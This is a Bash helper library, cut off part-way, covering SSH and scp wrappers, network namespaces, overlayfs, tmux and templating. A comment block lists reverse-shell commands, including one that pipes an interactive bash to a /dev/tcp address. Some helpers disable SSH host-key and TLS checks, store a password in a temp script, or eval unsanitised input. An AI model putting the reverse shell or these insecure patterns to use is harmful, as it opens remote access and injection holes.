#!/bin/echo Warnning, this library must only be sourced!
# shellcheck disable=SC2086 disable=SC2155

# TO BE SOURCED ONLY ONCE:
if [ -z ${__functions_inc+x} ]; then
    __functions_inc=1
else
    return 0
fi
# Disable unicode.
LC_ALL=C
LANG=C

#set -o pipefail  # trace ERR through pipes,only available on Bash
set -o errtrace  # trace ERR through 'time command' and other functions
# bash 4.2(centos 7) nounset arr[@]: unbound variable, when arr=().
# need  set +u; echo arr[@]; set -u; avoid it
# or ${arr[@]-}
if (( BASH_VERSINFO[0]*100 + BASH_VERSINFO[1] > 440 )); then
set -o nounset   ## set -u : exit the script if you try to use an uninitialised variable
fi
set -o errexit   ## set -e : exit the script if any statement returns a non-true return value

VERSION+=("8c1fbfe3[2025-01-22T08:58:18+08:00]:functions.sh")

# need bash version >= 4.2 for associative arrays and other features.
if (( BASH_VERSINFO[0]*100 + BASH_VERSINFO[1] < 402 )); then
    printf '%s\n' "bash >= 4.2 is required for this script." >&2
    exit 1 
fi

#shopt -s expand_aliases
#alias

dummy() { :; }

list_func() {
    #function_name startwith _ is private usage!
    typeset -f | awk '/ \(\) $/ && !/^main / {print $1}' | grep -v "^_"
    alias
#    local fncs=$(declare -F -p | cut -d " " -f 3 | grep -v "^_")
#    echo $fncs
}

func_wrapper() {
    local func=$1
    shift
    local args=$@
    ${func} ${args} || { [ $? = 127 ] && warn_msg "${func} not implemented\n"; }
}

# #  match pattern, print start blanks number
# cat file | awk '/mirrors/{print gsub(" ", "", $0)}'

#  echo '{"key": "val"}' | json2yaml | yaml2json
yaml2json() {
  python3 -c 'import sys, yaml, json; print(json.dumps(yaml.safe_load(sys.stdin.read())))'
}

yaml2json_pretty()  {
  python3 -c 'import sys, yaml, json; print(json.dumps(yaml.safe_load(sys.stdin.read()), indent=2, sort_keys=False))'
}

json2yaml()  {
  python3 -c 'import sys, yaml, json; print(yaml.dump(json.loads(sys.stdin.read())))'
}

# cat <<EOF > $HOME/.config/libvirt/libvirt.conf
#uri_aliases = [
#  "hail=qemu+ssh://root@hail.cloud.example.com/system",
#  "sleet=qemu+ssh://root@sleet.cloud.example.com/system",
#]
#uri_default = "qemu:///system"
# EOF
# QEMU_ALIAS=system?xxx virsh_wrap...
# QEMU_ALIAS=test virsh_wrap...
virsh_wrap() {
    local host="${1}"
    local port="${2}"
    local user="${3}"
    shift 3;
    try virsh -q -c qemu${host:++ssh}://${host:+${user:+${user}@}${host}${port:+:${port}}}/${QEMU_ALIAS:-system} $@
}

# write_file myfile <<EOF / write_file myfile 1 <<'EOF'
# msg....
# EOF
write_file() {
    local file=${1:-}
    local append=${2:-}
    info_msg "Writing ${append:+append }${file:-/dev/stdout}\n"
    try cat ${file:+\>${append:+\>} ${file}}
}

# cat /usr/bin/ls | create_file xx/a/b/c/d/xxx.file 0755 nobody nogroup
# create_file a/b/c/d/xxx.file 0600 nobody nogroup <<EOF
# cat <<EOF | create_file a/b/c/d/xxx.file 0600 nobody nogroup
# message
# EOF
create_file() {
    local target=${1:-/dev/stdin}
    local mode=${2:-}
    local owner=${3:-}
    local group=${4:-}
    try install -D ${mode:+-m ${mode} }${owner:+-o ${owner} }${group:+-g ${group} }/dev/stdin ${target}
}

# eval $(parse_yaml "info.yml")
#
# cat <<EOF | parse_yaml ""  myprefix_
# local:
#   info: 'local_srv'
#   host:
#     ipaddr: 127.0.0.1
#     port: 2701
#   access:
#     username: 'user'
#     password: 'pass'
#   nics:
#   - net_name: net1 aaa bb
#     net_type: BRIDGE
#     mac: xxx
#   - net_name: net2
#     net_type: NAT
#     mac: xxx2
# EOF
parse_yaml() {
    local input=${1:-/dev/stdin}
    local prefix=${2:-}
    local space='[[:space:]]*' word='[a-zA-Z0-9_]*' fs=$(echo @|tr @ '\034')
    sed -e '/- [^\“]'"[^\']"'.*: /s|\([ ]*\)- \([[:space:]]*\)|\1-\'$'\n''  \1\2|g' \
        "${input}" | \
    sed -ne "s|^\(${space}\):|\1|" \
        -e "s|^\(${space}\)\(${word}\)${space}:${space}[\"']\(.*\)[\"']${space}\$|\1${fs}\2${fs}\3|p" \
        -e "s|^\(${space}\)\(${word}\)${space}:${space}\(.*\)${space}\$|\1${fs}\2${fs}\3|p" | \
    awk -F${fs} '{
        indent = length($1)/2;
        vname[indent] = $2;
        for (i in vname) {if (i > indent) {delete vname[i]}}
            if (length($3) > 0) {
                vn=""; for (i=0; i<indent; i++) {vn=(vn)(vname[i])("_")}
                printf("%s%s%s=\"%s\"\n", "'${prefix}'",vn, $2, $3);
            }
    }'
}
# sed_e=(-E
# -e "s|^[^\s#].*\s/\s.*$|UUID=${new_uuid} / xfs noatime,relatime 0 0|g"  #replace
# )
# sed_e+=(-e "$ a $(date)") #append
# sed_e+=(-e "/^key=/d") #delete
# cat fstab | safe_sed sed_e
# safe_sed sed_e fstab
safe_sed() {
    local opts=${1}
    local file=${2:-}
    local cmd="sed ${file:+-i} \"\${${opts}[@]}\" ${file}"
    [ -e "${file}" ] && try $(truecmd cp) ${file} ${file}.orig
    try "${cmd}"
}

# hex_to_rgb "#FFFFFF"
# hex_to_rgb "000000"
hex_to_rgb() {
    : "${1/\#/}"
    ((r = 16#${_:0:2}, g = 16#${_:2:2}, b = 16#${_:4:2}))
    printf '%s\n' "$r $g $b"
}

# rgb_to_hex "r" "g" "b"
rgb_to_hex() {
    printf '#%02x%02x%02x\n' "$1" "$2" "$3"
}

# #if ssh login with password, need set password first
# set_sshpass "password"
# ssh_func root@192.168.168.123 60022 "ls -l /;ip a"
# rm -f ${SSH_ASKPASS}
# unset SSH_ASKPASS
# cat <<EOF > ~/.ssh/config
# ControlMaster auto
# ControlPath  ~/.ssh/%r@%h:%p
# ControlPersist 600
# EOF
set_sshpass() {
    local pass=${1}
    local SSH_ASKPASS_SCRIPT=$(mktemp)
    try cat > ${SSH_ASKPASS_SCRIPT} <<EOF
#!/bin/bash
echo "${pass}"
EOF
    try chmod 744 ${SSH_ASKPASS_SCRIPT}
    info_msg "set ssh askpass = ${SSH_ASKPASS_SCRIPT}\n"
    export SSH_ASKPASS=${SSH_ASKPASS_SCRIPT}
}

download() {
    local ipaddr=${1}
    local port=${2}
    local user=${3}
    local rfile=${4}
    local lfile=${5}
    warn_msg "download ${user}@${ipaddr}:${port}${rfile} ====> ${lfile}\n"
    try scp -P${port} ${user}@${ipaddr}:${rfile} ${lfile}
}

upload() {
    local lfile=${1}
    local ipaddr=${2}
    local port=${3}
    local user=${4}
    local rfile=${5}
    warn_msg "upload ${lfile} ====> ${user}@${ipaddr}:${port} ${rfile}\n"
    try scp -P${port} ${lfile} ${user}@${ipaddr}:${rfile}
    # cat ${lfile} | ssh -p${port} ${user}@${ipaddr} dd of=${rfile}
}
# ssh_func user@host port func args....
# msg=$(ssh_func user@ip port "cat /msg.txt")
# ssh_func func "" "arg2 arg2" arg3
# SUDO=1 ssh_func func "" "arg2 arg2" arg3 # only once sudo func via ssh
# SUDO=1; ..... #all ssh_func will sudo
ssh_func() {
    local ssh=${1}
    local port=${2}
    local func_name=${3}
    shift 3
    local args=("$@")
    info_msg "ssh${SUDO:+ sudo} ${ssh}:${port}${SSH_ASKPASS:+(askpass:${SSH_ASKPASS})} => ${func_name}\n"
    local ssh_opt="-t -oLogLevel=error -o StrictHostKeyChecking=no -o UpdateHostKeys=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=60 -p${port} ${ssh}"
    local bash_opt="-o errexit -s"
    defined QUIET || bash_opt="-x ${bash_opt}"
    try setsid ssh ${ssh_opt} ${SUDO:+sudo} /bin/bash ${bash_opt} << EOF
export LANG=C
export LC_ALL=C
$(typeset -f "${func_name}" 2>/dev/null || true)
${func_name} $([ "${#args[@]}" -gt 0 ] && printf '"%s" ' "${args[@]}")
EOF
}

# disply_func name [name...]
disply_func() {
    local retval=0
    for f; do
        if [ "$(builtin type -type $f)" != "function" ] ; then
            # "func: $f: not a function" 1>&2
            retval=1    # one failed
            continue
        fi
        builtin type $f | sed 1d
    done
    return $retval
}
# reverse-shell
# local<192.168.168.A>  run: nc -lp9999
# local<192.168.168.A>  run: socat file:`tty`,raw,echo=0 tcp-listen:9999
# remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
# remote<192.168.168.B> run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.168.A:9999

eval2bg() {
    #Keep Background Processes Running After a Shell Exits(nohup/disown)
    eval "$@" &>/dev/null & disown;
}

# rand=$(random)
# rand=$(random 1 10)
# random 1 10 5
random() {
    shuf -i ${1:-1}-${2:-65535} -n ${3:-1}
}

uuid() {
    cat /proc/sys/kernel/random/uuid
}

# retry sudo ctr --namespace k8s.io ...
retry() {
    local rc=0
    local retries=${MAX_RETRIES:-3}
    for attempt in $(seq 0 ${retries}); do
        rc=0
        [[ $attempt -gt 0 ]] && info_msg "Attempt $attempt of ${retries}\n"
        "$@"
        rc=$?
        [[ $rc -eq 0 ]] && break
        [[ $attempt -eq ${retries} ]] && exit $rc
        sleep $(random 1 10)
    done
}

gen_passwd() {
    local size=${1:-8}
    # cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c ${size}
    tr </dev/urandom -dc A-Za-z0-9 | head -c ${size}
}

temp_folder() {
    local root=${1:-/tmp}
    local prefix=${2:-}
    mktemp -d "${root}/${prefix}$(date +'%Y%m%d%H%M%S')-XXXXXXXXXX"
}

# save file data(base64) from __BIN_BEGINS__ to out.
# out is null then output to stdout
# echo "__BIN_BEGINS__" >> test.sh && base64 data.bin >> test.sh
# save_bin ${DIRNAME}/${SCRIPTNAME} | tar -zpvx -C $WORK_DIR
save_bin() {
    local file=$1
    local out=${2:-}
    defined DRYRUN && {
        info_msg "${file} bin-data to ${out:-stdout}\n"
        return 0
    }
    local bin_start=$(awk '/^__BIN_BEGINS__/ { print NR + 1; exit 0; }' ${file})
    # vim -e -s -c 'g/start_pattern/+1,/stop_pattern/-1 p' -cq file.txt
    # awk '/start_pattern/,/stop_pattern/' file.txt
    # sed -n /start_pattern/,/stop_pattern/p file.txt
    tail -n +${bin_start} ${file} | eval "base64 -d ${out:+> ${out}}"
}

#fetch http://a.com/abc.zip aaa.zip
fetch() {
    info_msg "fetch ${2} ==> ${1}"
    if type wget > /dev/null 2>&1 ; then
        try wget --no-check-certificate -O "${2}" "${1}" >/dev/null 2>&1
    elif type curl > /dev/null 2>&1 ; then
        try curl --insecure --remote-name -o "${2}" "${1}" >/dev/null 2>&1
    else
        exit_msg 'Warning: Neither wget nor curl is available. online updates unavailable\n'
    fi
}

# divide %1/%2 rounding up
ceil() {
    divide=$1
    by=$2
    echo $(((divide+by-1)/by))
}

is_in_list_separator_helper ()
{
    local sep element list
    sep=${1}
    shift
    element=${1}
    shift
    list=${*}
    echo ${list} | grep -qe "^\(.*${sep}\)\?${element}\(${sep}.*\)\?$"
}

is_in_space_sep_list ()
{
    local element
    element=${1}
    shift
    is_in_list_separator_helper "[[:space:]]" "${element}" "${*}"
}

is_in_comma_sep_list ()
{
    local element
    element=${1}
    shift
    is_in_list_separator_helper "," "${element}" "${*}"
}


# Usage:
#   join , a "b c" d #a,b c,d
#   join / var local tmp #var/local/tmp
#   join , "${FOO[@]}" #a,b,c
# ----------------------------------------------
join() { local IFS="${1}"; shift; echo "${*}"; }

human_readable_disk_size() {
    local bytes=$1
    local __M=$((1048576))
    local __G=$((1024*__M))
    local __T=$((1024*__G))
    local __P=$((1024*__T))
    if [ $bytes -ge $__P ]; then safe_echo $((bytes/__P))P; return; fi
    if [ $bytes -ge $__T ]; then safe_echo $((bytes/__T))T; return; fi
    if [ $bytes -ge $__G ]; then safe_echo $((bytes/__G))G; return; fi
    safe_echo $((bytes/__M))M
}

#SIZE=$(($(echo $SIZE | sed 's|[bB]||' | sed 's|[kK]|* 1024|' | sed 's|[mM]|* 1024 * 1024|' | sed 's|[gG]|* 1024 * 1024 * 1024|')))
human_readable_format_size()
{
    local size=$1
    local fs=
    if [[ $size -ge 1073741824 ]]; then
        fs=$(echo - | awk "{print $size/1073741824}")
        #fs=${fs/./,}
        printf "%.2f GiB" $fs
    else
        if [[ $size -ge 1048576 ]]; then
            fs=$(echo - | awk "{print $size/1048576}")
            #fs=${fs/./,}
            printf "%.2f MiB" $fs
        else
            if [[ $size -ge 1024 ]]; then
                fs=$(echo - | awk "{print $size/1024}")
                #fs=${fs/./,}
                printf "%.2f KiB" $fs
            else
                printf "%d Bytes" $size
            fi
        fi
    fi
}

setup_ns() {
    local ns_name="$1"
    try $(truecmd ip) netns add ${ns_name}
    maybe_netns_run "ip addr add 127.0.0.1/8 dev lo" "${ns_name}"
    maybe_netns_run "ip link set lo up" "${ns_name}"
    try mkdir -p "/etc/netns/$ns_name"
}

maybe_netns_addlink() {
    local link="$1"
    local ns_name="${2:-}"
    local newname="${3:-}"
    try $(truecmd ip) link set "${link}" ${ns_name:+netns ${ns_name} }${newname:+name ${newname} }up
}

# cat <<EOF >${ovlerlay}/a.sh
# #!/usr/bin/env bash
# mount -t proc proc /proc
# mount -t sysfs /sys sys
# hostname mydocer
# /etc/init.d/ssh start
# export PS1="mydocker##\033[1;31m\u\033[m@\033[1;32m\h:\033[33;1m\w\033[m$"
# exec /bin/bash --noprofile --norc -o vi
# EOF
# chmod 755 /a.sh
# docker_shell "mydocker" "${ns_name}" "$rootfs" "/a.sh" "args"
docker_shell() {
    local info="$1"
    local ns_name="${2}"
    local rootfs="${3}"; shift 3
    local shell="${1:-/bin/bash --noprofile --norc -o vi}"; shift || true
    local args="${@:-}"
    local ps1=[${info}${rootfs:+:${rootfs}}${ns_name:+@${ns_name}}]
    local colors=$($(truecmd tput) colors 2> /dev/null)
    if [ $? = 0 ] && [ ${colors} -gt 2 ]; then
        ps1+="\033[1;31m\u\033[m@\033[1;32m\h:\033[33;1m\w\033[m$"
    else
        ps1+="\u@\h:\w$"
    fi

    defined DRYRUN && { blue>&2 "DRYRUN: ";purple>&2 "docker: ${ns_name}${rootfs:+@rootfs:${rootfs}} ${shell} ${args}\n"; return 0; }
    ip netns exec "${ns_name}" \
        unshare --mount --ipc --uts --pid --fork --mount-proc -- \
            ${rootfs:+$(truecmd chroot) ${rootfs}} \
            /usr/bin/env -i \
            SHELL=/bin/bash \
            HOME=${HOME:-/} \
            TERM=${TERM:-} \
            HISTFILE= \
            COLORTERM=${COLORTERM:-} \
            PS1=${ps1} \
            ${shell} ${args} || true
}

# tmux select-window -t <session-name>:<windowID>
# tmux send-keys -t "${sess}:${window}" "history -c;reset" Enter
tmux_input() {
    local sess="$1" window="$2" input="$3"
    defined DRYRUN && { blue>&2 "DRYRUN: ";purple>&2 "tmux send-keys -t ${sess}:${window} \"${input}\" Enter\n"; return 0; }
    local cmd_size=-60.60
    stderr_is_terminal || cmd_size=    #stderr is redirect show all cmd
    blue>&2 "Begin: ";purple>&2 "%${cmd_size}s." "tmux(${sess}:${window})${input}"
    local start_time=$(date +%s.%N)
    tmux send-keys -t "${sess}:${window}" "${input}" Enter
    local elapsed_time=$(date +%s.%N --date="${start_time} seconds ago")
    green>&2 " (%.4f)done.\n" ${elapsed_time}
    # tmux capture-pane -t "${sess}:${window}" -p
}

maybe_tmux_netns_chroot() {
    local sess="$1" window="$2"
    local ns_name="${3:-}" rootfs="${4:-}"
    local unshared="${5:-}"
    defined DRYRUN && { blue>&2 "DRYRUN: ";purple>&2 "tmux ${sess}:${window}${rootfs:+rootfs=${rootfs}}${ns_name:+@${ns_name}}\n"; return 0; }
    tmux has-session -t "${sess}" 2> /dev/null && tmux new-window -t "${sess}" -n "${window}" || tmux set-option -g status off\; new-session -d -n "${window}" -s "${sess}" &>/dev/null
    local tmux_wname="\033k${window}\033[m" #fix tmux 1.8 Prefix+w window title list
    local ps1=[${window}${rootfs:+:${rootfs}}${ns_name:+@${ns_name}}]
    ps1+=${tmux_wname}
    local colors=$($(truecmd tput) colors 2> /dev/null)
    if [ $? = 0 ] && [ ${colors} -gt 2 ]; then
        ps1+="\033[1;31m\u\033[m@\033[1;32m\h:\033[33;1m\w\033[m$"
    else
        ps1+="\u@\h:\w$"
    fi

    defined DRYRUN && { blue>&2 "DRYRUN: ";purple>&2 "tmux: ${sess}:${window}{rootfs:+@rootfs:${rootfs}} shell\n"; return 0; }
    tmux send-keys -t "${sess}:${window}" "exec \
        ${ns_name:+$(truecmd ip) netns exec ${ns_name}} \
        ${unshared:+$(truecmd unshare) --mount --ipc --uts --pid --fork --mount-proc --} \
        ${rootfs:+$(truecmd chroot) ${rootfs}} \
        /bin/env -i \
        SHELL=/bin/bash \
        HOME=${HOME:-/} \
        TERM=\${TERM:-} \
        HISTFILE= \
        COLORTERM=\${COLORTERM:-} \
        PS1='${ps1}' \
        /bin/bash --noprofile --norc -o vi" Enter
    tmux_input "${sess}" "${window}" "history -c;reset"
    # tmux send-keys -t "${sess}:${window}" "history -c;reset" Enter
    # tmux send-keys -t "${sess}:${window}" "stty cols 1000" Enter
}
# maybe_netns_shell "busybox" "${ns_name}" "rootfs" "busybox" "sh -l"
# maybe_netns_shell "busybox" "${ns_name}" "rootfs" "/bin/sh" "-l"
maybe_netns_shell() {
    local info="$1"; shift || true
    local ns_name="${1:-}"; shift || true
    local rootfs="${1:-}"; shift || true
    local shell="${1:-/bin/bash}"; shift || true
    local args="${@:---noprofile --norc -o vi}"
    local ps1=[${info}${rootfs:+:${rootfs}}${ns_name:+@${ns_name}}]
    local colors=$($(truecmd tput) colors 2> /dev/null)
    if [ $? = 0 ] && [ ${colors} -gt 2 ]; then
        ps1+="\033[1;31m\u\033[m@\033[1;32m\h:\033[33;1m\w\033[m$"
    else
        ps1+="\u@\h:\w$"
    fi

    local cmds="${ns_name:+$(truecmd ip) netns exec ${ns_name}} \
        ${rootfs:+$(truecmd chroot) ${rootfs}} \
        /bin/env -i \
        SHELL=${shell} \
        HOME=${HOME:-/} \
        TERM=${TERM:-} \
        HISTFILE= \
        COLORTERM=${COLORTERM:-} \
        PS1=${ps1} \
        ${shell} ${args}"
    defined DRYRUN && { blue>&2 "DRYRUN: ";purple>&2 "$cmds\n"; stdin_is_terminal || cat >&2; return 0; }
    trap "echo 'CTRL+C!!!!'" SIGINT
    ${cmds} || true
    trap - SIGINT
}

#     cmds="
#         touch log
#         ls -l /
#     "
#     maybe_netns_run "" "${ns_name}" "" <<< $cmds
#     echo "$cmds" | maybe_netns_run
#     cat <<EOF | maybe_netns_run "" "${ns_name}" ""
#         echo hello > log
#         ip a
# EOF
#     echo -n "msg" | maybe_netns_run cat "${ns_name}" ""
#     maybe_netns_run "bash -s" "${ns_name}" "" <<EOF
#         ifconfig
#         start-stop-daemon --start --quiet --background --exec '/sbin/zebra'
# EOF
maybe_netns_run() {
    local cmds="${1:-$(cat)}"
    local ns_name="${2:-}"
    local rootfs="${3:-}"
    try "${ns_name:+$(truecmd ip) netns exec ${ns_name} }${rootfs:+$(truecmd chroot) ${rootfs} }${cmds}"
}

netns_exists() {
    local ns_name="$1"
    # Check if a namespace named $ns_name exists.
    # Note: Namespaces with a veth pair are listed with '(id: 0)' (or something). We need to remove this before lookin
    # /var/run/netns/${ns_name} ?? exists
    ip netns list | sed 's/ *(id: [0-9]\+)$//' | grep --quiet --fixed-string --line-regexp "${ns_name}"
}

cleanup_ns() {
    local ns_name="$1"
    try $(truecmd ip) netns del ${ns_name} || true
    try rm -rf "/etc/netns/$ns_name" || true
}

bridge_exists() {
    local bridge="$1"
    local ns_name="${2:-}"
    ${ns_name:+$(truecmd ip) netns exec "${ns_name}" }[ -e /sys/class/net/${bridge}/bridge/bridge_id ]
}

maybe_netns_bridge_addlink() {
    local bridge="$1"
    local link="$2"
    local ns_name="${3:-}"
    maybe_netns_run "ip link set ${link} master ${bridge}" "${ns_name}"
    maybe_netns_run "ip link set dev ${link} up" "${ns_name}"
}

maybe_netns_bridge_dellink() {
    local link="$1"
    local ns_name="${2:-}"
    maybe_netns_run "ip link set ${link} promisc off" "${ns_name}" || true
    maybe_netns_run "ip link set ${link} down" "${ns_name}" || true
    maybe_netns_run "ip link set dev ${link} nomaster" "${ns_name}" || true
}

maybe_netns_setup_bridge() {
    local bridge="$1"
    local ns_name="${2:-}"
    maybe_netns_run "ip link add ${bridge} type bridge" "${ns_name}"
    maybe_netns_run "ip link set ${bridge} up" "${ns_name}"
}

maybe_netns_setup_veth() {
    local veth_left="$1"
    local veth_right="$2"
    local ns_name="${3:-}"
    maybe_netns_run "ip link add ${veth_left} type veth peer name ${veth_right}" "${ns_name}"
}

cleanup_link() {
    local link="$1"
    local ns_name="${2:-}"
    maybe_netns_run "ip link delete ${link}" "${ns_name}" || true
}

# /bin/mount -t proc proc /proc
# /bin/mount -t sysfs /sys sys
# /bin/mount -t devtmpfs none /dev
# [ -e /dev/console ] || /bin/mknod -m 622 /dev/console c 5 1
# [ -e /dev/null ]    || /bin/mknod -m 666 /dev/null c 1 3
# [ -e /dev/zero ]    || /bin/mknod -m 666 /dev/zero c 1 5
# [ -e /dev/ptmx ]    || /bin/mknod -m 666 /dev/ptmx c 5 2
# [ -e /dev/tty ]     || /bin/mknod -m 666 /dev/tty c 5 0
# [ -e /dev/random ]  || /bin/mknod -m 444 /dev/random c 1 8
# [ -e /dev/urandom ] || /bin/mknod -m 444 /dev/urandom c 1 9
# [ -d /dev/pts ]     || /bin/mkdir -p /dev/pts
# /bin/mount -t devpts -o gid=4,mode=620 none /dev/pts
# echo "start shm"
# [ -d /dev/shm ]     || /bin/mkdir -p /dev/shm
# /bin/mount -t tmpfs none /dev/shm/
# echo "start dbus"
# /bin/dbus-uuidgen > /var/lib/dbus/machine-id
# [ -d /var/run/dbus ]|| /bin/mkdir -p /var/run/dbus
# /bin/dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
#
#start process with special PID: echo 1 > /proc/sys/kernel/ns_last_pid;  .....
setup_overlayfs() {
    local lower="$1"
    local rootmnt="$2"
    # local overlay_size_mb="${3:-1}"
    try mkdir -p ${rootmnt}/tmpfs
    # try mount -t tmpfs tmpfs -o size=${overlay_size_mb}M ${rootmnt}/tmpfs
    try mkdir -p ${rootmnt}/tmpfs/upper ${rootmnt}/tmpfs/work
    try mount -v -t overlay overlay -o lowerdir=${lower},upperdir=${rootmnt}/tmpfs/upper,workdir=${rootmnt}/tmpfs/work ${rootmnt}/
}

cleanup_overlayfs() {
    local rootmnt="$1"
    # local keep_tmpfs="${2:-}"
    try umount -Rv ${rootmnt} || true
    # try "${keep_tmpfs:+echo need manul exec: }umount ${rootmnt}/tmpfs" || true
    # try "${keep_tmpfs:+echo need manul exec: }rm -rf ${rootmnt}/tmpfs" || true
}

get_ipaddr() {
    $(truecmd ip) -4 -br addr show ${1} | $(truecmd grep) -Po "\\d+\\.\\d+\\.\\d+\\.\\d+"
}

# local val=abc
# prompt val "input" 2
# echo $val
prompt() {
    local var="${1}"
    local msg="${2}"
    local tmout=${3:-}
    local nchars=${4:-}
    local value=""
    {
        trap "exit -1" SIGINT SIGTERM
        read ${nchars:+-n ${nchars}} ${tmout:+-t ${tmout}} -p "${msg}" value || true
        value="${value//\"/\'}";
    } 2>&1
    if [ ! -z "${value}" ]; then
        eval "${var}"=\"${value}\"
    fi
    echo ""
}

#confirm default N,when timeout
confirm() {
    local msg=${1:-confirm}
    local tmout=${2:-5}
    local ANSWER=""
    prompt ANSWER "${msg} [y/N] " "${tmout}" "1" 
    if [ "${ANSWER}" = "Y" ] || [ "${ANSWER}" = "y" ]; then
        return 0
    fi
    return 1
}

http_code_description() {
    local code=${1}
    case "${code}" in
       000) echo "Not responding within timeout seconds" ;;
       100) echo "Informational: Continue" ;;
       101) echo "Informational: Switching Protocols" ;;
       200) echo "Successful: Http OK" ;;
       201) echo "Successful: Created" ;;
       202) echo "Successful: Accepted" ;;
       203) echo "Successful: Non-Authoritative Information" ;;
       204) echo "Successful: No Content" ;;
       205) echo "Successful: Reset Content" ;;
       206) echo "Successful: Partial Content" ;;
       300) echo "Redirection: Multiple Choices" ;;
       301) echo "Redirection: Moved Permanently" ;;
       302) echo "Redirection: Found residing temporarily under different URI" ;;
       303) echo "Redirection: See Other" ;;
       304) echo "Redirection: Not Modified" ;;
       305) echo "Redirection: Use Proxy" ;;
       306) echo "Redirection: status not defined" ;;
       307) echo "Redirection: Temporary Redirect" ;;
       400) echo "Client Error: Bad Request" ;;
       401) echo "Client Error: Unauthorized" ;;
       402) echo "Client Error: Payment Required" ;;
       403) echo "Client Error: Forbidden" ;;
       404) echo "Client Error: Not Found" ;;
       405) echo "Client Error: Method Not Allowed" ;;
       406) echo "Client Error: Not Acceptable" ;;
       407) echo "Client Error: Proxy Authentication Required" ;;
       408) echo "Client Error: Request Timeout within ${timeout} seconds" ;;
       409) echo "Client Error: Conflict" ;;
       410) echo "Client Error: Gone" ;;
       411) echo "Client Error: Length Required" ;;
       412) echo "Client Error: Precondition Failed" ;;
       413) echo "Client Error: Request Entity Too Large" ;;
       414) echo "Client Error: Request-URI Too Long" ;;
       415) echo "Client Error: Unsupported Media Type" ;;
       416) echo "Client Error: Requested Range Not Satisfiable" ;;
       417) echo "Client Error: Expectation Failed" ;;
       500) echo "Server Error: Internal Server Error" ;;
       501) echo "Server Error: Not Implemented" ;;
       502) echo "Server Error: Bad Gateway" ;;
       503) echo "Server Error: Service Unavailable" ;;
       504) echo "Server Error: Gateway Timeout within ${timeout} seconds" ;;
       505) echo "Server Error: HTTP Version Not Supported" ;;
       *)   echo "${code} (unknown)"
    esac
}


##Usage: check_http_status 'http://www.example.com'
check_http_status() {
    local url=$1
    local status=$(curl -s -o /dev/null -w '%{http_code}' $url 2>/dev/null)
    safe_echo $status
}

stdin_is_terminal() {
    [ -t 0 ]
}

stdout_is_terminal() {
    [ -t 1 ]
}

stderr_is_terminal() {
    [ -t 2 ]
}

is_user_root() {
    [ "$(id -u)" -eq 0 ]
}

# auto_su "$@"
# main "$@"
auto_su() {
    ARGS=( "$@" )
    [[ $UID == 0 ]] || exec sudo -E -p "$SCRIPTNAME  must be run as root. Please enter the password for %u to continue: " -- "$BASH" -- "$DIRNAME/$SCRIPTNAME" "${ARGS[@]}"
}

min() { [ "$1" -le "$2" ] && echo "$1" || echo "$2"; }
max() { [ "$1" -ge "$2" ] && echo "$1" || echo "$2"; }
#cursor op
erase_line() {
    printf '%b' $'\e[1K\r'
}
cursor_onoff() {
    local op="$1"
    case "${op}" in
        hide) printf "\e[?25l" ;;
        show) printf "\e[?25h" ;;
        *) return 1 ;;
    esac
    return 0
}
cursor_moveto() {
    local x="${1}"
    local y="${2}"
    ## write
    printf "\e[%d;%d;f" ${y} ${x}
    return 0
}
cursor_pos() {
    local CURPOS
    read -sdR -p $'\E[6n' CURPOS
    CURPOS=${CURPOS#*[} # Strip decoration characters <ESC>[
    echo "${CURPOS}"    # Return position in "row;col" format
}
cursor_row() {
    local COL
    local ROW
    IFS=';' read -sdR -p $'\E[6n' ROW COL
    echo "${ROW#*[}"
}
cursor_col() {
    local COL
    local ROW
    IFS=';' read -sdR -p $'\E[6n' ROW COL
    echo "${COL}"
}
safe_echo() {
    printf -- '%b\n' "$*"
}

cprintf() {
    local color=$1
    local fmt=$2
    shift 2
    local  EC=$'\033'    # escape char
    local  EE=$'\033[0m' # escape end
    # if stdout is console, turn on color output.
    stdout_is_terminal && printf "${EC}[1;${color}m${fmt}${EE}" "$@" || printf "${fmt}" "$@"
}

# echo "hello {{DISK_DEV}} \$(({{VAL}}*2))" | render_tpl2 vm
# same as render_tpl  #LHS='${' RHS='}'
# REPS default two LHS/RHS like {{ }}
# LHS='%' RHS='%'
render_tpl2() {
    local str="$(cat)"
    local arr=$1
    local SEQN="$(seq 1 ${REPS:-2})"
    for arg in $(array_print_label ${arr}) ; do
        local sub="${LHS:=$(printf '{%.0s' $SEQN)}${arg}${RHS:=$(printf '}%.0s' $SEQN)}"
        local val="$(array_get ${arr} "$arg")"
        str="${str//"$sub"/$val}"
    done
    cat <<< "$str"
}
#
# declare -A vm=([DISK_DEV]=vdc [VAL]=2)
# echo "hello '\${DISK_DEV}' \$((\${VAL}*2))" | render_tpl vm
render_tpl() {
    local arr=$1
    local j= LHS= RHS= line=
    for j in $(array_print_label ${arr}) ; do eval "local $j=\"$(array_get ${arr} $j)\""; done
    while IFS= read -r line ; do
        while [[ "$line" =~ (\$\{[a-zA-Z_][a-zA-Z_0-9]*\}) ]] ; do
            LHS=${BASH_REMATCH[1]}
            RHS="$(eval echo "\"$LHS\"")"
            line=${line//$LHS/$RHS}
        done
        printf "%s\n" "$line"
        # eval "echo \"$line\"" #risk
    done
    return 0
}

# declare -A abc;
# read_kv abc <<< $(cat kv.txt)
# array_print_label abc
# array_print abc
print_kv() {
    local j=
    for j in $(array_print_label $1) ; do safe_echo "$j=$(array_get $1 $j)"; done
}

empty_kv() {
    local j=
    for j in $(array_print_label $1) ; do unset "$1[$j]"; done
}

read_kv() {
    local line=
    while IFS= read -r line; do
        [[ ${line} =~ ^\ *#.*$ ]] && continue #skip comment line
        [[ ${line} =~ ^\ *$ ]] && continue #skip blank
        eval "$1[${line%%=*}]=${line#*=}"
    done
}

# val=$(menu_select "you choice: "  aaaa bbbb)
# items must not blank(space) char
menu_select() {
    local prompt=${1}
    shift 1
    local org_PS3=${PS3:-}
    PS3="${prompt}"
    select sel in ${@}; do
        [ -z  ${sel} ] || {
            echo -n "${sel}"
            break
        }
    done
    PS3=${org_PS3}
}

# choices=("1xx" "choine 1" "2" "choice 2")
# choices=($(cd /home/johnyin/disk/mygit/github_private/ && LC_ALL=C LANG=C ls -lhp  | awk -F ' ' '{print $9 " " $5}'))
# id=$(dialog "title xxa" "menu xxx" choices[@])
# echo $id
dialog() {
    local title="${1}"
    local menu="${2}"
    declare -a items=("${!3}")
